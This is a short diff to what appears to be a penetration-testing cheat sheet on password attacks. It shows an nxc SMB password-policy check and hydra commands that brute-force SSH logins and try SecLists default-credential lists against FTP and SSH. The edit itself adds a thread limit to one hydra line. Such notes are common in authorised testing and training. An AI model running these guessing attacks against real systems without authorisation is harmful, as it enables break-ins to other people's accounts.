@@ -10,7 +10,7 @@ nxc smb <TargetIP> -u '' -p '' --pass-pol
 
 ## Cheap guesses first
 Empty, the username itself, and the username reversed:
-hydra -L users.txt -e nsr ssh://<TargetIP>
+hydra -L users.txt -e nsr -t 4 ssh://<TargetIP>
 Default pairs for the service, from SecLists:
 hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://<TargetIP>
 hydra -C /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt ssh://<TargetIP> -t 4
